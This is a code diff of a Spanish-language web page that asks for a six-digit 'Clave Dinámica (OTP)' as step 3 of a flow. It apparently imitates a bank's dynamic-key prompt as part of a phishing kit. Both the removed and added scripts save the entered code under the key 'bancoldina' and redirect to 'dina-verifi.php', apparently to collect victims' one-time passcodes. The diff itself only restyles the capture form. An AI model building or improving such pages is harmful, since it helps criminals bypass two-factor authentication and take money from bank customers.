@@ -2,180 +2,103 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Clave Dinámica</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clave Dinámica (OTP)</title>
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <link rel="stylesheet" href="main.css">
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
     body {
+      background-color: #fff;
       font-family: Arial, sans-serif;
-      background: #fff;
+    }
+    .step-indicator {
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      margin: 20px auto;
     }
-
-    .container {
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-
-    .steps {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-
-    .step-circle {
+    .circle {
       width: 24px;
       height: 24px;
       border-radius: 50%;
-      background-color: #0053ba;
+      background-color: #ccc;
       color: white;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 14px;
-      font-weight: bold;
     }
-
+    .circle.active {
+      background-color: #0057D8;
+    }
     .line {
-      flex: 1;
+      width: 50px;
       height: 2px;
       background-color: #ccc;
-      margin: 0 8px;
+      margin: 0 10px;
     }
-
-    .dot {
-      width: 12px;
-      height: 12px;
-      background-color: #ccc;
-      border-radius: 50%;
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
     }
-
-    h2 {
-      font-size: 20px;
-      margin-bottom: 25px;
+    .form-control::placeholder {
+      color: #999;
     }
-
-    .otp-inputs {
-      display: flex;
-      justify-content: space-between;
-      gap: 8px;
-      margin-bottom: 25px;
-    }
-
-    .otp-inputs input {
-      width: 40px;
-      height: 50px;
-      text-align: center;
-      font-size: 18px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      background-color: #f2f2f2;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: bold;
-      background-color: #ccc;
-      color: #444;
+    .btn-primary {
+      background-color: #0057D8;
       border: none;
-      border-radius: 30px;
-      cursor: not-allowed;
+      border-radius: 20px;
+      width: 100%;
+      padding: 12px;
+      font-weight: bold;
     }
-
-    .btn.enabled {
-      background-color: #0053ba;
-      color: #fff;
-      cursor: pointer;
-    }
-
-    .footer-link {
+    .text-link {
+      display: block;
       text-align: center;
-      font-size: 14px;
-      margin-top: 25px;
-    }
-
-    .footer-link a {
-      color: #0053ba;
-      text-decoration: none;
+      margin-top: 15px;
+      color: #0057D8;
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <!-- PASOS -->
-  <div class="steps">
-    <div class="step-circle">3</div>
+  <div class="step-indicator">
+    <div class="circle" style="background-color: #0057D8;">1</div>
+    <div class="line" style="background-color: #0057D8;"></div>
+    <div class="circle" style="background-color: #0057D8;">2</div>
     <div class="line"></div>
-    <div class="dot"></div>
-    <div class="line"></div>
-    <div class="dot"></div>
+    <div class="circle active">3</div>
   </div>
 
-  <h2>Clave Dinámica (OTP)</h2>
+  <div class="container">
+    <h4 class="text-center mb-4">Clave Dinámica (OTP)</h4>
 
-  <form id="otpForm">
-    <div class="otp-inputs">
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
-    </div>
+    <form onsubmit="guardarYContinuar(event)">
+      <div class="mb-3">
+        <input type="text" id="otp" class="form-control" placeholder="Ingresa tu clave dinámica (OTP)" maxlength="6" required pattern="[0-9]*" inputmode="numeric">
+      </div>
 
-    <button type="submit" class="btn" id="continuarBtn" disabled>Continuar</button>
-  </form>
+      <button type="submit" class="btn btn-primary">Continuar</button>
+    </form>
 
-  <div class="footer-link">
-    <a href="#">En otro momento</a>
+    <a href="#" class="text-link">En otro momento</a>
   </div>
-</div>
 
-<script>
-  const inputs = document.querySelectorAll(".otp");
-  const continuarBtn = document.getElementById("continuarBtn");
+  <script>
+    function guardarYContinuar(event) {
+      event.preventDefault();
+      const otp = document.getElementById('otp').value.trim();
 
-  inputs.forEach((input, index) => {
-    input.addEventListener("input", (e) => {
-      if (!/^\d$/.test(e.target.value)) {
-        e.target.value = "";
-      } else if (index < inputs.length - 1) {
-        inputs[index + 1].focus();
+      if (otp.length === 6 && /^[0-9]+$/.test(otp)) {
+        localStorage.setItem("bancoldina", otp);
+        window.location.href = "dina-verifi.php";
+      } else {
+        alert("Ingresa un código OTP válido de 6 dígitos.");
       }
-
-      validar();
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && index > 0 && !input.value) {
-        inputs[index - 1].focus();
-      }
-    });
-  });
-
-  function validar() {
-    const filled = Array.from(inputs).every(input => input.value);
-    continuarBtn.disabled = !filled;
-    continuarBtn.classList.toggle("enabled", filled);
-  }
-
-  document.getElementById("otpForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const codigo = Array.from(inputs).map(input => input.value).join("");
-    localStorage.setItem("bancoldina", codigo);
-    window.location.href = "dina-verifi.php";
-  });
-</script>
+    }
+  </script>
 
 </body>
 </html>
